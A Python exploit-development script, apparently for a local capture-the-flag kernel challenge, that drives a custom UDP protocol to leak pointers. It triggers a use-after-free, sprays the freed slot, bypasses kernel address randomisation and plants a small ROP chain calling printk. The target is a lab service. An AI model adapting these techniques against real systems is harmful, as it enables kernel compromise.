#!/usr/bin/env python3
"""Local protocol probe for the NEPHILIM kernel challenge."""

import socket
import struct
import sys


HOST = "127.0.0.1"
PORT = 31337
MAGIC = b"NKTP"
KERNEL_LINK = 0xFFFFFFFF81000000
PRINTK_LINK = 0xFFFFFFFF8195C929
POP_RDI_LINK = 0xFFFFFFFF815D1A7B


def request(op, payload=b"", seq=1, timeout=2.0):
    packet = struct.pack(">4sBBHHH", MAGIC, 1, op, seq, len(payload), 0) + payload
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(packet, (HOST, PORT))
        response, _ = sock.recvfrom(1024)
    if response[:4] != MAGIC:
        raise RuntimeError(f"bad magic: {response[:4]!r}")
    version, rop, rseq, length, checksum = struct.unpack(">BBHHH", response[4:12])
    body = response[12:12 + length]
    if version != 1 or rop != op or rseq != seq or len(body) != length:
        raise RuntimeError(
            f"bad response header: version={version} op={rop} seq={rseq} length={length}"
        )
    return body, checksum


def probe():
    body, checksum = request(1, struct.pack("<Q", 0x4141414141414141))
    print(f"create: {body.hex()} checksum=0x{checksum:04x}")
    if len(body) != 16:
        raise RuntimeError(f"unexpected create response size: {len(body)}")
    desc_id, desc_ptr = struct.unpack("<QQ", body)
    body, checksum = request(4, struct.pack("<Q", desc_id), seq=2)
    print(f"info:   {body.hex()} checksum=0x{checksum:04x}")
    print(f"id=0x{desc_id:x} desc=0x{desc_ptr:x}")


def uaf_probe():
    body, _ = request(1, struct.pack("<Q", 0x4242424242424242), seq=10)
    desc_id, desc_ptr = struct.unpack("<QQ", body)
    body, _ = request(3, struct.pack("<Q", desc_id), seq=11)
    snap_id = struct.unpack("<Q", body)[0]
    body, _ = request(2, struct.pack("<Q", desc_id), seq=12)
    remove_status = struct.unpack("<I", body)[0]
    request(7, b"", seq=13)
    spray = bytes(128)
    body, _ = request(5, spray, seq=14)
    spray_ptr = struct.unpack("<Q", body)[0]
    print(
        f"snapshot=0x{snap_id:x} remove_status=0x{remove_status:x} "
        f"descriptor=0x{desc_ptr:x} spray=0x{spray_ptr:x} "
        f"reused={spray_ptr == desc_ptr}"
    )


def control_probe():
    body, _ = request(1, struct.pack("<Q", 0x4343434343434343), seq=20)
    desc_id, desc_ptr = struct.unpack("<QQ", body)
    body, _ = request(4, struct.pack("<Q", desc_id), seq=21)
    _, _, _, printk, pivot = struct.unpack("<5Q", body)
    body, _ = request(3, struct.pack("<Q", desc_id), seq=22)
    snap_id = struct.unpack("<Q", body)[0]
    request(2, struct.pack("<Q", desc_id), seq=23)
    request(7, b"", seq=24)

    kernel_base = printk - PRINTK_LINK + KERNEL_LINK
    pop_rdi = kernel_base + (POP_RDI_LINK - KERNEL_LINK)
    validate = pivot - 0x20
    payload = bytearray(128)
    struct.pack_into("<Q", payload, 0x00, desc_ptr + 0x28)
    struct.pack_into("<Q", payload, 0x10, desc_ptr + 0x20)
    struct.pack_into("<Q", payload, 0x20, pivot)
    struct.pack_into("<Q", payload, 0x28, pop_rdi)
    struct.pack_into("<Q", payload, 0x30, desc_ptr + 0x58)
    struct.pack_into("<Q", payload, 0x38, printk)
    struct.pack_into("<Q", payload, 0x40, validate)
    struct.pack_into("<Q", payload, 0x48, validate)
    struct.pack_into("<Q", payload, 0x50, validate)
    marker = b"NK-CONTROL\n\x00"
    payload[0x58:0x58 + len(marker)] = marker

    body, _ = request(5, bytes(payload), seq=25)
    if len(body) != 8:
        raise RuntimeError(f"spray allocation failed: {body.hex()}")
    spray_ptr = struct.unpack("<Q", body)[0]
    print(
        f"snapshot=0x{snap_id:x} descriptor=0x{desc_ptr:x} spray=0x{spray_ptr:x} "
        f"reused={spray_ptr == desc_ptr}\n"
        f"kernel_base=0x{kernel_base:x} printk=0x{printk:x} pivot=0x{pivot:x} "
        f"pop_rdi=0x{pop_rdi:x}"
    )


if __name__ == "__main__":
    commands = {"probe": probe, "uaf-probe": uaf_probe, "control-probe": control_probe}
    if len(sys.argv) != 2 or sys.argv[1] not in commands:
        raise SystemExit(f"usage: {sys.argv[0]} probe|uaf-probe|control-probe")
    commands[sys.argv[1]]()
